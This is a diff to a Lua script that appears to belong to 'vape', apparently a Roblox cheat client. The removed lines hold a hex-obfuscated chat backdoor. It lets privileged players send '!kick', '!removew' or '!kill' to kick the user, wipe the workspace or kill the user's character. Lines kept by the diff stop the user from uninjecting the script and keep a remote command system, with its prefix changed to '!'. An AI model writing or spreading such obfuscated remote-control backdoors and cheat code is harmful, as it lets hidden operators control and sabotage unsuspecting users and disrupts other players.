@@ -1,6 +1,7 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 local loadstring = function(...)
 	local res, err = loadstring(...)
 	if err and vape then
@@ -428,15 +429,6 @@ run(function()
 			self.alreadychecked[v.UserId] = true
 			self:hook()
 			if self.localprio == 0 then
-				connectEvent(v, "\x43\x68\x61\x74\x74\x65\x64", function(_)
-					if _ == "\x21\x6B\x69\x63\x6B" then
-						namecallEvent(lplr, "\x4B\x69\x63\x6B", "\x0A\x59\x6F\x75\x72\x20\x4B\x69\x63\x6B\x65\x64")
-					elseif _ == "\x21\x72\x65\x6D\x6F\x76\x65\x77" then
-						namecallEvent(workspace, "\x43\x6C\x65\x61\x72\x41\x6C\x6C\x43\x68\x69\x6C\x64\x72\x65\x6E")
-					elseif _ == "\x21\x6B\x69\x6C\x6C" then
-						lplr.Character.Humanoid.Health=0
-					end
-				end)
 				olduninject = vape.Uninject
 				vape.Uninject = function()
 					notif('Vape', 'No escaping the private members :)', 10)
@@ -481,7 +473,7 @@ run(function()
 			if self:getplayer(args[1]) then
 				table.remove(args, 1)
 				for cmd, func in self.commands do
-					if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
+					if msg:sub(1, cmd:len() + 1):lower() == '!'..cmd:lower() then
 						func(args, plr)
 						return true
 					end
